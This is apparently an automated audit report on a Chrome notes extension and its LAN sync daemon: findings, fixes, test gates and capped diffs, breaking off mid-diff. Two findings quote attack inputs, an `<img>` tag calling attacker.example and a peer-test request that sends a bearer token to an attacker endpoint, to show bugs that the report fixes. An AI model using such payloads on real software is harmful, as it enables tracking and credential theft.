# Code deep optimizer — 2026-11-12

Repository: `mithudso/stickysites`; baseline `a4dc8246a9faa9743539ddbf20dd2810113b9e11`; version1.13.1. This report covers the full maintained repository and the companion bootstrap workflow. [Complete per-file coverage and finding ledger](maintenance-coverage-2026-11-12.json).

## 1. Per-iteration severity

| Iteration | Critical | High | Medium | Low | Nit |
|---|---:|---:|---:|---|---:|
| 1 | 2 | 11 | 52 | qualitative | 0 |
| 2 | 0 | 1 | 35 | qualitative | 0 |
| Final gate | pending | pending | None | qualitative residuals below | 0 |

Counts are corroborated distinct Medium+ triggers. One unreachable eleven-icon proposal is rejected: the product has six fixed note types. F48 is Medium because `notes-storage.js` is a test-only reference; the runtime authority is the worker. Two vault data-loss findings are Critical. Low observations remain qualitative rather than a fabricated total; they do not affect Medium+ convergence math. No unjustified demotions, cycling, or token/time budget exit is claimed.

The initial45-target dispatch yielded43 complete receipts; the initial CI/FUNDING bundles were incomplete. The second full dispatch completed65/65, including both missing bundles. The final source universe has68 targets. All JSONL agent messages were collected, including substantive reports before Stop footers. Local readers get complete source, Stage0.5 and15 local passes, at most8 local reads/checks, no external research or broad wrappers. Parent handles the three remaining pass IDs and cross-file/test-cost checks.

## 2. Findings and fixes

| Pass | file:anchor | Severity | Finding | Fix | Status |
|---|---|---|---|---|---|
| S1/C3 | peer/stickysites-peer.py:`peer/stickysites-peer.py:456` | High | F01 `test_peer()` sends the reusable bearer token to any supplied endpoint after accepting its arbitrary certificate. `/test?peer=ATTACKER:PORT` exposes this through an unauthenticated loopback GET. | Require a matching trusted fingerprint before sending credentials; return an identity-verification failure for unknown certificates. | applied |
| C1/P2/T1 | peer/stickysites-peer.py:`peer/stickysites-peer.py:581` | High | F02 The listening socket is SSL-wrapped with default handshake behavior. A client that connects and sends no TLS handshake blocks acceptance before `ThreadingHTTPServer` dispatches a worker, preventing subsequent LAN requests. | Perform TLS handshakes inside workers with a finite timeout; close stalled connections. | applied |
| C1/P2/T1 | peer/stickysites-peer.py:`peer/stickysites-peer.py:414` | Medium | F05 Updating with a valid new `pairKey` and invalid `staticPeers` mutates the live key before raising. The request returns 400, configuration is not saved, and old peers/caches are not cleared. | Validate all requested fields first, then atomically apply and persist the update with its trust-cache resets. | applied |
| C1/P2/T1 | peer/stickysites-peer.py:`peer/stickysites-peer.py:540` | Medium | F07 `Content-Length: -1` bypasses both upper bounds and reaches `rfile.read(-1)`, which waits for EOF. Oversized streamed data also bypasses the intended length limit. | Reject malformed and negative lengths before reading; impose a request-body read timeout. | applied |
| C1/P2/T1 | scripts/rotate-workflow-logs.mjs:scripts/rotate-workflow-logs.mjs:68 | Medium | F19 A newest section containing a fenced example with `## Example` is split into multiple sections. Rotation can archive part of that newest section, breaking its code fence and violating the preservation guarantee. | Recognize section headings only outside Markdown fences, including backtick and tilde fences. | applied |
| C1/P2/T1 | scripts/rotate-workflow-logs.mjs:scripts/rotate-workflow-logs.mjs:111–113 | Medium | F20 Archive append succeeds, then live-file writing fails. Retrying appends the same sections again. Interruption after the live file is truncated can also leave it incomplete. | Use temporary files and atomic replacement for individual writes, plus a recoverable transaction record to reconcile the archive and live file after interruption. | applied |
| S1/C3 | src/content/crypto-content.js:`src/content/crypto-content.js:137` | Critical | F29 Call `disable()` with encrypted notes and no cached key. It deletes the configuration containing the salt without decrypting anything. A wrong key or corrupt envelope also gets silently skipped before configuration deletion. | Require a usable key and successful decryption of every encrypted bucket before removing configuration or cached key. Propagate failure and preserve recovery state. | applied |
| S1/C3 | src/content/crypto-content.js:`src/content/crypto-content.js:107` | High | F30 After successful enable with passphrase A, call enable with B. Configuration and cached key switch to B, but `_encryptAllNotes` skips existing envelopes encrypted with A. The stored salt for A is overwritten. | Reject enable when encryption is already configured. Implement any intended key rotation as a separate operation that verifies and decrypts with the old key before replacement. | applied |
| C1/P2/T1 | src/content/outline.js:`src/content/outline.js:35–36` | High | F34 With encryption enabled and a cached key present, `decryptValue` rejects for an unreadable envelope. `readRawMap` returns `{}`; `render` creates “My outline,” and `writeRawMap` replaces the original envelope. Direct `writeDoc` has the same destructive path. | Propagate an explicit unreadable-storage error and block mutations and automatic creation until reading succeeds. Surface a privacy-safe error. | applied |
| S1/C3 | src/content/panel.js:`src/content/panel.js:33`, `bodyToHtml`; `_renderTodo.applyInlineMarkdown` | High | F36 Save `<img src="https://attacker.example/pixel">` as a note or TODO note. Rendering creates an external request. Raw HTML and quote-bearing Markdown URLs can also introduce event attributes into the host-page DOM. Isolated storage does not make authored markup inert. | Sanitize rich HTML with an explicit element/attribute/protocol allowlist; construct Markdown links with DOM APIs and escaped text. | applied |
| S1/C3 | src/content/panel.js:`src/content/panel.js:99`, `_readNote` → `_render`; `_writeNote`, `_writeStructured` | Critical | F37 With encryption enabled and no cached key, writes fall through to plaintext. A single-note write replaces its encrypted envelope. Failed reads also return `null`, after which map/TODO rendering automatically creates a record. | Distinguish missing, locked, and failed reads. Block writes and initialization while locked or unreadable; require a usable key whenever encryption is enabled. | applied |
| C1/P2/T1 | src/content/panel.js:`src/content/panel.js:83`, `open` | High | F38 Start `open(A)` with a delayed storage read, then finish `open(B)`, then resolve A. A renders last while `_activeKey` still identifies B. Editing the displayed A body writes it under B. Closing during a read can likewise be undone by its late completion. | Give each open a generation token; invalidate it on close and check it after every await before rendering or mutating session state. Bind saves to immutable session keys and labels. | applied |
| C1/P2/T1 | src/content/sticky-inject.css:src/content/sticky-inject.css:32–45 | Medium | F43 Render an expanded collapsible cluster with eleven icons. Icons, gaps, padding, and borders require 430px. The 400px maximum and `overflow: hidden` clip the final icon; hover or `.is-expanded` does not remove that limit. Additional icons become completely inaccessible by pointer. Both orientations are affected. | Allow the expanded main axis to accommodate its contents within the viewport, with scrolling when needed. Retain the collapsed limit. | rejected: product has six fixed types; eleven-icon trigger is unreachable |
| C1/P2/T1 | src/shared/notes-storage.js:`src/shared/notes-storage.js:62–74` | Medium | F48 Concurrent `writeSiteNote('a', …)` and `writeSiteNote('b', …)` both read the same map. Each writes its own snapshot; the last write removes the other's new note although both return success. The same pattern affects page, daily, outline, todo, and preference mutations. | Route mutations through one authoritative serialized writer per storage key across extension contexts. | applied |
| C1/P2/T1 | src/shared/peer-sync.js:`src/shared/peer-sync.js:121,249` | High | F51 Sync reads record A, waits for fetch, and a local writer saves newer B. Sync then merges against A and writes remote C, overwriting B even when B has the newest timestamp. | Serialize sync commits with local writers, or detect intervening writes and retry the merge under coordinated commit protection. | applied |
| C1/P2/T1 | src/shared/todo-bridge.js:`src/shared/todo-bridge.js:130` | Medium | F55 While native messaging is pending, another writer updates the todo map. This function then saves its earlier snapshot, overwriting that update. A concurrent switch to encrypted storage can likewise be overwritten with the earlier plaintext map. | Coordinate this read/merge/write operation with all todo writers, or use a revision-aware conflict mechanism that retries reconciliation and rechecks encryption before committing. A reread alone does not eliminate the race. | applied |
| C1/P2/T1 | tests/crypto-vault-compat.test.js:`tests/crypto-vault-compat.test.js:20` | Medium | F56 An installed vault throws during module initialization, has a broken transitive import, or loses its `/vault` export. The catch converts each failure into `vault = null`, so the entire suite skips as though the optional package were absent. | Skip only when the optional package itself is absent; rethrow other import errors. | applied |
| T2 | package-lock.json:devDependencies | High | P1 Vite8.3.2 has published high advisories. | Compatible locked Vite/Vitest update; final npm audit. | applied |
| M4/S5 | PRIVACY.md:network and folder statements | High | P2 Guides deny off-device transfer despite LAN/folder integrations. | Document native, loopback, LAN, cloud, plaintext metadata and JWK boundaries. | applied |
| C1/C3/S1/P2/T1 | scripts/check-syntax.mjs:classic entry grammar | Medium | R01 Classic entry-point export can pass standalone Node parsing. | Manifest/page-derived vm.Script grammar gate; retain module/CJS checks. | applied |
| C1/C3/S1/P2/T1 | src/content/todo.js:normalizeData | Medium | R02 Duplicate IDs reorder the wrong task. | Regenerate duplicate identities without dropping contents; reset unknown section references. | applied |
| C1/C3/S1/P2/T1 | src/content/todo.js:normalizeData | Medium | R03 Orphan section references hide tasks. | Regenerate duplicate identities without dropping contents; reset unknown section references. | applied |
| C1/C3/S1/P2/T1 | tests/browser-integration.test.js:actual structured input edits | Medium | R04 Opening Todo/Outline without editing falsely claims full editor coverage. | Mutate actual Todo and Outline inputs, flush and assert stored text. | applied |
| C1/C3/S1/P2/T1 | src/content/mentions.js:_selectItem | Medium | R05 Moved selection can delete unrelated note text. | Require the original collapsed caret/node/end/text before replacing the trigger. | applied |
| C1/C3/S1/P2/T1 | tests/runtime-regressions.test.js:entered | Medium | R06 Unbounded microtask polling can starve deadlines and cleanup. | Bound callback-entry attempts with timer-backed yielding and cleanup. | applied |
| C1/C3/S1/P2/T1 | popup.css:settings-section/tag-filters | Medium | R07 Settings controls are clipped without a scroll container. | Scrollable bounded Settings/tag regions preserve notes/footer space; actual guarded Chrome layout check. | applied |
| C1/C3/S1/P2/T1 | popup.css:settings-section/tag-filters | Medium | R08 Many tags crowd all notes out of the fixed popup. | Scrollable bounded Settings/tag regions preserve notes/footer space; actual guarded Chrome layout check. | applied |
| C1/C3/S1/P2/T1 | src/content/crypto-content.js:getCachedKey | Medium | R09 Ordinary HTTP content contexts lack WebCrypto and cannot read an unlocked vault. | Reuse the vault lifecycle in the extension worker; HTTP fallback over whitelisted IPC. | applied |
| C1/C3/S1/P2/T1 | tests/service-worker.test.js:onMessage return | Medium | R10 Test ignores the literal true required to retain the asynchronous message channel. | Assert accepting handlers return literal true and response follows active round. | applied |
| C1/C3/S1/P2/T1 | src/content/cluster.js:init/_initDrag | Medium | R11 Restored coordinates can put all controls outside the viewport. | Clamp mounted/restored/resize geometry and cancel dragging/cursor on blur. | applied |
| C1/C3/S1/P2/T1 | src/content/cluster.js:init/_initDrag | Medium | R12 Window blur leaves background dragging active. | Clamp mounted/restored/resize geometry and cancel dragging/cursor on blur. | applied |
| C1/C3/S1/P2/T1 | src/content/panel.js:flushPendingSave/syncFromStorage/getCleanHtml | Medium | R13 An edit while switching notes can save under the next key. | Immutable renderer sessions; inert transitions; drain new edits; guard dirty/in-flight changes; serialize checked attributes. | applied |
| C1/C3/S1/P2/T1 | src/content/panel.js:flushPendingSave/syncFromStorage/getCleanHtml | Medium | R14 Storage events after blur replace pending edits. | Immutable renderer sessions; inert transitions; drain new edits; guard dirty/in-flight changes; serialize checked attributes. | applied |
| C1/C3/S1/P2/T1 | src/content/panel.js:flushPendingSave/syncFromStorage/getCleanHtml | Medium | R15 Rich-text checkbox properties are lost on serialization. | Immutable renderer sessions; inert transitions; drain new edits; guard dirty/in-flight changes; serialize checked attributes. | applied |
| C1/C3/S1/P2/T1 | scripts/rotate-workflow-logs.mjs:recovery/acquisition | Medium | R16 Two dead-owner recoveries can remove the new lock and both enter. | Exclusive acquisition.guard encloses recovery/acquire/release for all cooperating contenders. | applied |
| C1/C3/S1/P2/T1 | src/content/safe-html.js:sanitize | Medium | R17 Unbounded apply arguments abort wide-wrapper sanitization. | Unwrap nodes individually; preserve bounded safe native FONT attributes. | applied |
| C1/C3/S1/P2/T1 | src/content/safe-html.js:sanitize | Medium | R18 Allowed FONT loses native face/size/color formatting. | Unwrap nodes individually; preserve bounded safe native FONT attributes. | applied |
| C1/C3/S1/P2/T1 | scripts/check-doc-indexes.mjs:reference destinations | Medium | R19 Reference-style dead links escape validation. | Resolve full/collapsed/shortcut references through the same containment validator. | applied |
| C1/C3/S1/P2/T1 | src/shared/peer-sync.js:ts/mergeNotes | Medium | R20 Malformed lexical timestamps dominate valid edits and deletions indefinitely. | Validate ISO timestamps and compare parsed instants; malformed remotes ignored and equal instants keep local. | applied |
| C1/C3/S1/P2/T1 | src/content/outline.js:saveNow | Medium | R21 Failed saves resolve undefined and permit navigation that loses edits. | Return the persisted record or null, block transitions on failure, permit retry. | applied |
| C1/C3/S1/P2/T1 | scripts/harness-resources.mjs:cleanup | Medium | R22 Unbounded browser/server close prevents later cleanup and failure reporting. | Bound resource-close waits, continue cleanup, retain unconfirmed profiles and original errors. | applied |
| C1/C3/S1/P2/T1 | scripts/verify-live.mjs:S6/S8/S9 | Medium | R23 Outlines-only checks accept plaintext in other populated vault buckets. | Verify exact reopened/stored site text and every populated encrypted/restored bucket. | applied |
| C1/C3/S1/P2/T1 | scripts/verify-live.mjs:S6/S8/S9 | Medium | R24 Unconditional site-save success hides dropped persistence. | Verify exact reopened/stored site text and every populated encrypted/restored bucket. | applied |
| C1/C3/S1/P2/T1 | src/shared/todo-bridge.js:applyHostResult | Medium | R25 A host-created section cannot be cleared by an unsectioned host result. | Preserve only genuinely user-owned local groups when host returns unsectioned. | applied |
| C1/C3/S1/P2/T1 | src/content/outline-ops.js:escXml | Medium | R26 XML attribute whitespace normalization changes exported multiline notes. | Encode LF/CR/tab numeric references after escaping ampersands. | applied |
| C1/C3/S1/P2/T1 | scripts/generate-docs.mjs:configurationBodies | Medium | R27 Direct configuration symlink reads bypass input containment and can publish external fields. | Require regular contained inputs before capturing metadata; fixtures assert external sentinel exclusion. | applied |
| C1/C3/S1/P2/T1 | src/content/sticky-inject.js:showLockOverlay/onUrlChange | High | R28 Host-page scripts can read the injected password input. | Fixed extension-origin unlock window; no host passphrase input. Start generation-aware open before awaiting its flush. | applied |
| C1/C3/S1/P2/T1 | src/content/sticky-inject.js:showLockOverlay/onUrlChange | Medium | R29 Awaiting a save before starting open lets a late SPA callback undo a user close. | Fixed extension-origin unlock window; no host passphrase input. Start generation-aware open before awaiting its flush. | applied |
| C1/C3/S1/P2/T1 | scripts/store-screenshots.mjs:closePanel/openNoteForScreenshot | Medium | R30 Main-world namespace access and fixed sleeps can capture a stale previous note. | Use DOM Close, await closed state, target identity and seeded content. | applied |
| C1/C3/S1/P2/T1 | src/shared/note-writer.js:loadedIds | Medium | R31 A stale outline save drops a clip added after it loaded. | Track all loaded nested IDs; preserve foreign new nodes while respecting explicit loaded deletions. | applied |
| C1/C3/S1/P2/T1 | peer/stickysites-peer.py:listen_loop/folder_peers/fetch_peer_snapshot | Medium | R32 Nested UDP JSON can kill the Apple Python discovery listener. | Handle decoder exhaustion; nonblocking bounded regular descriptors; pairing-generation guards before publication/aggregation. | applied |
| C1/C3/S1/P2/T1 | peer/stickysites-peer.py:listen_loop/folder_peers/fetch_peer_snapshot | Medium | R33 Matching FIFO blocks folder reads; unsafe/nonregular entries need bounded descriptor reads. | Handle decoder exhaustion; nonblocking bounded regular descriptors; pairing-generation guards before publication/aggregation. | applied |
| C1/C3/S1/P2/T1 | peer/stickysites-peer.py:listen_loop/folder_peers/fetch_peer_snapshot | Medium | R34 Old-key in-flight 200/304/folder results can repopulate revoked trust caches. | Handle decoder exhaustion; nonblocking bounded regular descriptors; pairing-generation guards before publication/aggregation. | applied |
| C1/C3/S1/P2/T1 | popup.js:convertVault/showPassphraseForm | Medium | R35 Rejected enable/disable leaves controls stuck and allows duplicate submissions. | Await, catch and restore controls in finally; guard duplicate submission and retain notes. | applied |
| C1/C3/S1/P2/T1 | popout.js:refreshLock | Medium | R36 An open popout keeps decrypted DOM visible after another context locks. | Conceal on a current locked state and reopen after unlock. | applied |

The table highlights the risk-bearing cases; the linked ledger retains every remaining initial observation, proposed severity, corroboration disposition and fix. Fixes preserve versioned keys, read-time legacy adaptation, AES-GCM/PBKDF2 envelope parameters, local cached-JWK custody, six note types, optional integrations, and zero runtime npm dependencies. There is no invented app server, offscreen runtime, MCP server, datastore, license grant or SLA.

Behavioral evidence includes deliberate stale/failed/locked storage, concurrent clips/records/sync, corrupt bucket staging, moved mention caret, live checkbox state, failed outline retry, nested clip preservation, ISO offsets/ties, revoked peer trust, decoder/FIFO boundaries, concurrent recovery, contained document inputs, complete vault verification and actual structured editor edits. New code is exercised through actual classic scripts, actual worker handlers, actual daemon server factories, and side-effect-free tooling helpers. Frozen vectors were not regenerated.

Low residuals: clipboard/popout failure feedback; periodic-sync latency while a round is active; edge-clamping mention suggestions; richer keyboard-focus styling; deterministic promo fonts; atomic replacement of prior store ZIPs; rotation cost for very many sections; legacy opt-in download sleeps; extra test hardening for timestamps, tampering, defaults and helper fidelity. These do not justify broad redesigns. Several Low suggestions were fixed incidentally: duplicate prefs loading, stale popout grip cleanup, bounded tooling cleanup, hostile Git fixtures, TLS acceptance synchronization and an accessible popup search name.

## 3. Verify gates

| Command / check | Baseline | After fixes | Verdict |
|---|---|---|---|
| npm ci | pass | lockfile compatible; CI reinstalls final lock | pass locally; final CI required |
| npm run lint |33 syntax-only JS |55 JS /16 classic entries plus ESLint | pass |
| npm test under process-tree guard |128 passed /23 optional skipped before new guard |225 passed /23 skipped before last focused Todo completion; final receipt carries current count | pass; final rerun required |
| Python daemon suite |Homebrew discovery failed; Apple7 passed with ResourceWarnings |guarded23/23 on Python3.15.2 and3.9.6, ResourceWarnings as errors | pass for guarded subset |
| Full Python32 / actual UDP |original7-test discovery baseline failed on Homebrew |required in loopback-only Linux CI namespace | local UDP policy limitation; CI final gate |
| docs:generate / docs:check-generated / docs:check-indexes |old path check passed |deterministic complete inventories and selected guide text | final generated checks recorded in receipt |
| npm run build:store |31 files,1.13.0 |runtime-only1.13.1 package | final package check required |
| npm audit --json |high Vite8.3.2 advisories |zero vulnerabilities with selected locked graph | pass |
| git diff --check / unchanged corpus |baseline clean |whitespace and unchanged frozen vectors | pass |
| Headless Chrome synthetic popup under guard |not established |200 tags:96px scroll region,289px notes, footer bottom600; Settings final Save bottom572 | pass; no extension loaded |

The two earlier newly-written red labels that unexpectedly passed were not counted as red evidence. Popup conversion tests were replayed against exact preserved iteration2 files to obtain genuine failures. The SPA test was corrected to intercept only its first flush; it then failed against the old path and passed after the generation fix. The Todo focus test needed the old debounce to fire; a corrected600ms case reproduced the wrong-key record. Python decoder exhaustion was corroborated on Apple3.9, not falsely attributed to Homebrew3.15. Failed harness-only attempts remain in local evidence.

The task-local macOS guard denies outbound traffic for each test process tree. Python reserves and inherits exact owned loopback TCP listeners. The guard cannot permit UDP and is unchanged; `sendto` fails with PermissionError. CI enables only loopback inside a fresh network namespace and drops to the runner user. Earlier pre-control fixture runs do not establish blanket absence of inherited-config/indexing effects. Source-generated tooling fixture paths were `os.tmpdir()/ss-docs-test-*` around04:56–05:36local (one recorded suffix `nKE1xF`); they used init/ls-files, no commits. Later fixtures strip GIT selectors/config, empty templates/global config, inspect effective hooks and prove a hostile post-commit sentinel does not run. No private hook/request/vector-store bodies were inspected.

## 4. Activated skills and pass applicability

- repo-bootstrapper: actual extension/daemon standards, prior audit retractions, source-backed guides/wiki and supported hub registry.
- code-deep-optimizer: standard full18-pass profile, two full finding sweeps, fresh local blind gate, central snapshots and crash-recovery stub. No quick, changed-only, suggest, feature, cross-model or broad wrapper mode.
- JavaScript/TypeScript and Python language guidance: classic/module grammar, async ownership, trust boundaries, stdlib resource/persistence handling.
- Chrome extension/security/vanilla UI guidance: MV3 contexts, injected DOM, safe rich text, extension-origin credentials and optional local integrations.
- Vault/software-pattern/review/testing/architecture references: preserve protocol and custody; real runtime versus reference modules; behavioral red→green gates.

Empirical mode is N/A: the repository has no held-out eval or benchmark suitable for champion–challenger promotion. Test totals are not a quality score. T4 finds no reason to invent a line-percentage threshold or live integration requirement. Existing optional private interoperability is not silently treated as passing.

Central external verification used authoritative npm metadata/audits, GitHub advisories and action refs, Chrome network/storage docs, GitHub funding schema, Python SSL docs and MDN secure-context behavior. Per-file reviewers did not repeat it. References: [Vite advisory](https://github.com/advisories/GHSA-587h-7wmj-h5pm), [MDN content-script secure contexts](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Content_scripts#secure_contexts), [Chrome storage](https://developer.chrome.com/docs/extensions/reference/api/storage).

## 5. Per-file unified diff excerpts

Every maintained source was read completely in fresh contexts. Only these illustrative diff excerpts are capped at12 lines per file, as the report format permits; omitted diff lines remain in the Git PR and full central snapshots. Generated outputs, the lockfile and this self-referential audit/ledger receive explicit metadata summaries. No source file was truncated or replaced by an excerpt.

### .env.example

```diff
diff --git a/.env.example b/.env.example
index b022369..9bda6fc 100644
--- a/.env.example
+++ b/.env.example
@@ -1,7 +1,9 @@
-# StickySites reads no environment variables at runtime — it is a Chrome extension with no
-# server and no dotenv loader. The only variable in the repo is consumed by the optional
-# puppeteer harness (scripts/verify-live.mjs). Nothing here is a secret.
+# The browser extension has no dotenv loader. Export values in the launching shell;
+# this file is documentation and is not loaded automatically. These are paths, not secrets.
 
-# Path to a Chromium binary that honours --load-extension (branded Chrome 137+ ignores it).
... [diff excerpt capped; 8 further lines in Git]
```

### .github/FUNDING.yml

```diff
diff --git a/.github/FUNDING.yml b/.github/FUNDING.yml
index 4d48fbc..d395d92 100644
--- a/.github/FUNDING.yml
+++ b/.github/FUNDING.yml
@@ -1,8 +1,7 @@
-# These are supported funding model platforms
-
 github: mithudso
 patreon: mithudso
-venmo: @Mitchphudson
-paypal: https://www.paypal.com/ncp/payment/8WLQPBK6PHFX2
-cashapp: $mitchphudson
... [diff excerpt capped; 6 further lines in Git]
```

### .github/PULL_REQUEST_TEMPLATE.md

```diff
diff --git a/.github/PULL_REQUEST_TEMPLATE.md b/.github/PULL_REQUEST_TEMPLATE.md
index f527f77..dcc8b62 100644
--- a/.github/PULL_REQUEST_TEMPLATE.md
+++ b/.github/PULL_REQUEST_TEMPLATE.md
@@ -11,4 +11,5 @@
 - [ ] `npm run lint && npm test` pass locally
-- [ ] Extension reloaded at `chrome://extensions` and the changed surface exercised on a real page
-- [ ] (If storage or crypto changed) `npm run verify:live` run, or manual check of encrypt → lock → unlock
+- [ ] Changed surface exercised with relevant actual-runtime fixtures; validation and limits recorded
+- [ ] (If storage or crypto changed) encrypt → lock → unlock and failure preservation covered
+- [ ] Browser/manual validation recorded when run; no live activation implied by automated tests
 
```

### .github/SECURITY.md

```diff
diff --git a/.github/SECURITY.md b/.github/SECURITY.md
index 38486cd..bf56a7f 100644
--- a/.github/SECURITY.md
+++ b/.github/SECURITY.md
@@ -16,3 +16,4 @@ Open a **private security advisory** on this repository
 
-StickySites is a local-only Chrome extension: no servers, no network calls, no telemetry.
+StickySites stores notes locally and has no hosted telemetry service. Optional integrations
+use a native-messaging host, loopback HTTP, paired LAN peers, or a user-selected shared/cloud folder.
 The interesting surfaces are the AES-256-GCM vault (`src/content/crypto-content.js`), the
```

### .github/copilot-instructions.md

```diff
diff --git a/.github/copilot-instructions.md b/.github/copilot-instructions.md
index 7a16405..c4efa59 100644
--- a/.github/copilot-instructions.md
+++ b/.github/copilot-instructions.md
@@ -1,3 +1 @@
-# Copilot Instructions
-
 ## Default Execution Strategy
@@ -9,5 +7,5 @@
    `outline.js`, or `sticky-inject.js` from memory of an older version.
-2. **Run the checks after every change.** `npm run lint && npm test` (syntax gate + 125 unit
-   tests). Then reload the unpacked extension at `chrome://extensions` and exercise the
... [diff excerpt capped; 37 further lines in Git]
```

### .github/dependabot.yml

```diff
diff --git a/.github/dependabot.yml b/.github/dependabot.yml
index aff82a1..782a0ad 100644
--- a/.github/dependabot.yml
+++ b/.github/dependabot.yml
@@ -6 +6,5 @@ updates:
       interval: "weekly"
+  - package-ecosystem: "github-actions"
+    directory: "/"
+    schedule:
+      interval: "weekly"
```

### .github/workflows/ci.yml

```diff
diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
index 39d9cc3..b2f2d9e 100644
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -8,2 +8,5 @@ on:
 
+permissions:
+  contents: read
+
 jobs:
@@ -12,5 +15,6 @@ jobs:
     runs-on: ubuntu-latest
... [diff excerpt capped; 27 further lines in Git]
```

### .vscode/extensions.json

```diff
diff --git a/.vscode/extensions.json b/.vscode/extensions.json
index 27a9351..2916e14 100644
--- a/.vscode/extensions.json
+++ b/.vscode/extensions.json
@@ -4,3 +4,6 @@
     "editorconfig.editorconfig",
-    "nicolo-ribaudo.vitest-explorer"
+    "nicolo-ribaudo.vitest-explorer",
+    "dbaeumer.vscode-eslint",
+    "ms-python.python",
+    "ms-python.debugpy"
   ]
```

### .vscode/launch.json

```diff
diff --git a/.vscode/launch.json b/.vscode/launch.json
index e89fb2e..3499bd4 100644
--- a/.vscode/launch.json
+++ b/.vscode/launch.json
@@ -8,6 +8,11 @@
       "program": "${workspaceFolder}/node_modules/vitest/vitest.mjs",
-      "args": ["run", "${relativeFile}"],
+      "args": [
+        "run",
+        "${relativeFile}"
+      ],
       "console": "integratedTerminal",
... [diff excerpt capped; 33 further lines in Git]
```

### .vscode/settings.json

```diff
diff --git a/.vscode/settings.json b/.vscode/settings.json
index e6cb905..3146c16 100644
--- a/.vscode/settings.json
+++ b/.vscode/settings.json
@@ -4,3 +4,5 @@
   "editor.tabSize": 2,
-  "editor.rulers": [100],
+  "editor.rulers": [
+    100
+  ],
   "files.eol": "\n",
@@ -13,3 +15,6 @@
... [diff excerpt capped; 7 further lines in Git]
```

### CLAUDE.md

```diff
diff --git a/CLAUDE.md b/CLAUDE.md
index fe61ffd..89d7f92 100644
--- a/CLAUDE.md
+++ b/CLAUDE.md
@@ -14,3 +14,3 @@ Before grepping, query the machine-wide `global_ai_hub` MCP server (`hub_search_
 Chrome Extension (Manifest V3), vanilla JavaScript, no build step, single package.
-Version: **1.13.0** (`manifest.json` is canonical; `package.json` must match — `npm run lint` checks).
+The current version is in `manifest.json`; `package.json` must match (`npm run lint` checks).
 
@@ -19,3 +19,3 @@ stickysites/
   manifest.json            # MV3 manifest — permissions, content scripts (load order!), SW, command
-  package.json             # Dev tooling only (vitest, canvas) + npm scripts
... [diff excerpt capped; 116 further lines in Git]
```

### CONTRIBUTING.md

```diff
diff --git a/CONTRIBUTING.md b/CONTRIBUTING.md
index f5e38a6..a4d4fcd 100644
--- a/CONTRIBUTING.md
+++ b/CONTRIBUTING.md
@@ -13,3 +13,3 @@ and coding conventions.
 2. Make your changes, following the conventions in DEVELOPMENT.md
-3. Run `npm test` and ensure all tests pass
+3. Run `npm run lint`, `npm test`, `npm run test:peer`, and both documentation checks; see DEVELOPMENT.md for safe integration fixtures
 4. Submit a PR using the [PR template](.github/PULL_REQUEST_TEMPLATE.md)
```

### GEMINI.md

```diff
diff --git a/GEMINI.md b/GEMINI.md
index 8aebcf2..832d152 100644
--- a/GEMINI.md
+++ b/GEMINI.md
@@ -11,3 +11,3 @@ Quick facts:
   only the service worker is an ES module. Load order in `manifest.json` matters.
-- Checks: `npm run lint && npm test` (syntax gate + 125 vitest unit tests; `npm run test:peer` for the daemon). CI mirrors this.
+- Checks: `npm run lint && npm test` (syntax and semantic lint plus Vitest; `npm run test:peer` for synthetic daemon fixtures). CI also checks generated documentation and store packaging.
 - Storage: `chrome.storage.local` only, keys `stickysites_*_v1` + `stickysites_cached_key`.
```

### PRIVACY.md

```diff
diff --git a/PRIVACY.md b/PRIVACY.md
index 8f83af0..bc6e911 100644
--- a/PRIVACY.md
+++ b/PRIVACY.md
@@ -2,8 +2,8 @@
 
-_Last updated: 2026-09-28 (sync folder added)_
+_Last updated: 2026-11-12_
 
-StickySites is a Chrome extension that lets you keep notes attached to websites, pages, and
-dates, plus a to-do list and an outliner. This policy explains what the extension does with
-your data. The short version: **everything stays on your device; nothing is sent to us or to
... [diff excerpt capped; 146 further lines in Git]
```

### README.md

```diff
diff --git a/README.md b/README.md
index 466453a..b8fcb11 100644
--- a/README.md
+++ b/README.md
@@ -4,3 +4,3 @@
 
-Sticky notes for every website. A Chrome Extension (Manifest V3, v1.12.0) with six note
+Sticky notes for every website. A Chrome Extension (Manifest V3) with six note
 types, a floating draggable icon cluster, a rich-text workspace panel with find & replace and
@@ -8,3 +8,3 @@ types, a floating draggable icon cluster, a rich-text workspace panel with find
 outliner library, opt-in AES-256-GCM encryption at rest, and optional peer-to-peer sync between
-your own laptops on the same network. No servers, no internet calls.
... [diff excerpt capped; 37 further lines in Git]
```

### docs/ARCHITECTURE.md

```diff
diff --git a/docs/ARCHITECTURE.md b/docs/ARCHITECTURE.md
index 1fbe9f0..0e8018e 100644
--- a/docs/ARCHITECTURE.md
+++ b/docs/ARCHITECTURE.md
@@ -6,5 +6,5 @@ StickySites is a Chrome Extension (Manifest V3) that injects a floating note wor
 every web page. Notes live in `chrome.storage.local` with optional AES-256-GCM encryption.
-There are no servers, internet calls, or analytics. Two optional out-of-browser boundaries exist,
-both local: a native-messaging host that mirrors the global to-do list into `TODO.md`, and a
-loopback peer daemon that syncs notes between the user's own machines on the same LAN.
+There is no hosted StickySites service or telemetry. Optional native messaging mirrors
+to-dos into `TODO.md`. An optional loopback daemon relays snapshots to paired LAN computers
+or to a shared/cloud folder selected by the user.
... [diff excerpt capped; 126 further lines in Git]
```

### docs/COMPONENTS.md

```diff
diff --git a/docs/COMPONENTS.md b/docs/COMPONENTS.md
index f25c70f..6fb89f2 100644
--- a/docs/COMPONENTS.md
+++ b/docs/COMPONENTS.md
@@ -2,8 +2,8 @@
 
-Line counts as of v1.11.1. "Namespace" = the `window.StickySites.*` object a classic content
+"Namespace" = the `window.StickySites.*` object a classic content
 script attaches; "Exports" = ES module exports.
 
-## Service worker — `src/background/service-worker.js` (122 lines, ES module)
+## Service worker — `src/background/service-worker.js` (ES module)
... [diff excerpt capped; 174 further lines in Git]
```

### docs/DEVELOPMENT.md

```diff
diff --git a/docs/DEVELOPMENT.md b/docs/DEVELOPMENT.md
index 6457ff0..77bd0ea 100644
--- a/docs/DEVELOPMENT.md
+++ b/docs/DEVELOPMENT.md
@@ -4,3 +4,3 @@
 
-- Node.js ≥ 22 (`.nvmrc`) for tests and tooling — the extension itself needs no Node
+- A Node.js version matching `.nvmrc` and `package.json` engines for tests and tooling — the extension itself needs no Node
 - Chrome or a Chromium-based browser (Edge, Brave, Arc, Chrome Beta)
@@ -12,3 +12,3 @@
 git clone https://github.com/mithudso/stickysites.git && cd stickysites
-npm install          # vitest + canvas (dev dependencies only)
